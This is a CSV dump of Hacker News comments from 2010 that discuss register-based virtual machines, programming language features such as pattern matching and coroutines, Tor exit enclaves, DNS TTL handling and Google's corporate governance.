ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
1602919,comment,1600240,1601011,0,0,mahmud,,,"<i>Dalvik seemed intentionally as different from a conventional JVM as possible .. register-based rather than stack-based</i><p>That's because register IRs are easier to optimize than stack based ones. Have you heard of SSA? the canonical intermediate representation for high performance compilers; yeah, it's register based.<p>And Dalvik wasn't the first recent VM to be that ""different""; heard of Parrot? it's register based.",1281758379
1602918,comment,1601062,1601062,0,0,silentbicycle,,,"I'm a bit disappointed in this discussion. ""strangest"" language feature sounds like a crowd pointing and laughing. Boring! What are some novel, underappreciated, unexpectedly useful language features? (And this emphatically isn't about ""my favorite language vs yours"".)<p>Here are a couple, to get things rolling.<p>Pattern matching. This is a favorite of mine - stating what you want (or expect), possibly with variables, and letting the language generate the tree of if/case statements. I find pattern-matching code extremely easy to read, easy to extend, almost always right the first time, etc. It works with both static (ML-style variant types, reminding you to check exhaustively) and dynamic (Erlang-style, ""handle what you can or throw an exception"") typing. awk is based around a weaker form of pattern matching (only matching against ints and regexes, rather than whole trees), and it's still great for quick hacks. PM seems to mesh poorly with conventional OO, though.<p>Compile-time metaprogramming. This is HN, you've probably heard plenty about Lisp macros, so I'll leave it at that.<p>Incremental development / hot code loading. Erlang has this (with soft real-time guarantees), Lisp, Smalltalk, and basically anything image-based has had this for ages. It's often easier to grow a system piece by piece than to build it upfront and plug in together afterward.<p>Iterators/generators. Without needing a fully lazy-by-default language such as Haskell, it's often handy to have a handle into a (possibly infinite) stream that you can pull from as necessary. Prolog combines pattern matching (unification really, a step beyond pattern matching) with backtracking, so you can write ""generate and test"" code: ""here's what I want, this generates a stream of all possible candidates, here's how to narrow it down"". It's sometimes too slow for use in production (due to combinatorial blowups), but it's <i>excellent</i> for prototyping, and can usually be made good enough with some tweaks.<p>Coroutines and actors. Like iterators and generators, but breaking the flow of execution into lots of little autonomous pieces. Communication makes dataflow explicit, most things can be easily understood in isolation, and they can often be run in parallel. (Coroutines are cooperative.)",1281758307
1602917,comment,1600872,1600872,0,0,zitterbewegung,,,"Although this is great that duckduckgo is doing this it seems like it would only apply to a select group of people concerned about their privacy. It doesn't seem like the average person would be aware about what Tor is and would use it. I'm just wondering about the practicality of operating a Tor exit enclave.",1281758287
1602916,comment,1602294,1602715,0,0,whakojacko,,,"we started at the transistor level, building AND/OR gates. Then XOR/NAND etc, then a simple ALU (using real nand/and/or etc chips) then a simple register, etc all the way up, each step getting an integrated chip to replace what we had built with smaller components in the previous step.",1281758220
1602915,comment,1601978,1602581,0,0,robryan,,,"Yeah I knew the concept but didn't know this word to describe it, good to find out these little things.",1281758185
1602914,comment,1601608,1602897,0,0,avar,,,"Well, not following the RFCs is bad, but I can see why they do it.<p>Most people using low TTLs probably don't know what they're doing, and if you're a big ISP having to constantly make recursive queries hurts page load times for your customers, who'll blame you.",1281758140
1602913,comment,1601951,1602877,0,0,bryanh,,,"I definitely believe the agreement is necessary for Google to have regular access to its current channels looking forward (both across the net and especially with Android through Verizon). Yes, it is good for business.<p>There may be a huge outrage over it, but I tend to doubt it.<p>Furthermore, the anecdote ""Sergey Brin did not want to cave to any of the Chinese demands to operate inside of mainland China, but Eric Schmidt talked him into it"", if true, is pretty good evidence that the founders are more idealistic. I don't think that is patronizing.",1281758059
1602912,comment,1601951,1602241,0,0,jambo,,,"With respect to corporate governance, you can basically ignore the public shareholders in this case.<p>In addition to the fact that the law affords managements a lot of leeway in determining how to maximize shareholder value, Larry, Sergey, and Eric hold voting control due to the dual share class structure that public shareholders agreed to when they bid for shares in the IPO.<p>You can think of it as a limited partnership with three general partners.",1281758030
1602911,comment,1601281,1602548,0,0,peteypao,,,"Yeah, you're kidding me right?",1281757962
1602910,comment,1602907,1602907,0,0,wolfrom,,,"Facebook mentions 3000 comments, but the ones I saw had a good portion simply asking ""why?""",1281757838
